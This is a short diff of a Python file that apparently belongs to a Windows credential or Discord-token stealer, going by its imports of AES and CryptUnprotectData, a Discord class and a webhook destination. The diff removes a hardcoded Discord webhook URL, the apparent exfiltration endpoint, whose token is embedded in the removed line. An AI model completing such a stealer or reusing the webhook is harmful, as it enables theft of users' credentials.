@@ -2,7 +2,7 @@ import os, re, json, base64, requests, datetime
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1168113772808900709/jqGmXvPq5r7A4XR8f9Z6uZol6tsUu8N6swozgaU4I5CVHOtizTPWYwDY3c0Vu2_LYbZt"
+WEBHOOK_URL = ""
 
 class Discord:
     def __init__(self):
